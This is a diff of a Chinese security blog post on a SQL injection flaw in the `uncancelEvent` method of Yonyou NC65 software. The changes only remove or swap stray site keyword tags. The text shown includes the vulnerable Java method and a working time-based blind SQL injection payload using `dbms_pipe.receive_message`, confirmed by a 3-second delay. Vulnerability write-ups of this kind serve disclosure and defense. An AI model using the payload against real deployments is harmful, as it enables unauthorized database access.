@@ -22,14 +22,6 @@ NC65
 
 `SchedulerEventsAction` 此前出现过 `listUserSharingEvents` sql注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，详情可以看这篇[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html) ，而此次出现漏洞的方法变成了 `uncancelEvent`
 
-深入探索
-
-计算机安全
-
-软件
-
-搜索引擎
-
 ```
 public void uncancelEvent() throws BusinessException {
         this.cancelEventOperate("1");
@@ -87,4 +79,4 @@ event_id=-1'AND 1=dbms_pipe.receive_message('RDS',3)--+#+&startDate=2025-05-07 1
 
 成功延时 3 秒
 
-数据管理
+软件
